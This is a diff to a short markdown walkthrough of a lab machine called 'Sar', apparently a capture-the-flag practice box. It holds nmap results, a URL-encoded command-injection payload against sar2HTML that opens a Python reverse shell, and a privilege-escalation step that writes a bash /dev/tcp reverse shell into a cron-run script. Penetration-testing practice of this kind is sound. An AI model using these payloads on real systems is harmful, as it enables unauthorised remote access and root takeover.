@@ -1,4 +1,7 @@
-# NMAP
+# Sar
+
+## NMAP
+
 ```
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -16,16 +19,20 @@ PORT   STATE SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 ```
 
-# sar2HTML
+## sar2HTML
+
 https://www.exploit-db.com/exploits/47204
+
 ```
 http://192.168.65.35/sar2HTML/index.php?plot=;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22[MY_IP]%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
 ```
 
-## local.txt
+### local.txt
+
 local.txt is located at /home/local.txt
 
-# PrivEsc
+## PrivEsc
+
 ```
 www-data@sar:/tmp$ cat /etc/crontab
 cat /etc/crontab
@@ -64,5 +71,4 @@ www-data@sar:/var/www/html$ echo 'bash -i >& /dev/tcp/192.168.49.65/8888 0>&1' >
 www-data@sar:/var/www/html$ cat write.sh
 cat write.sh
 bash -i >& /dev/tcp/192.168.49.65/8888 0>&1
-
 ```
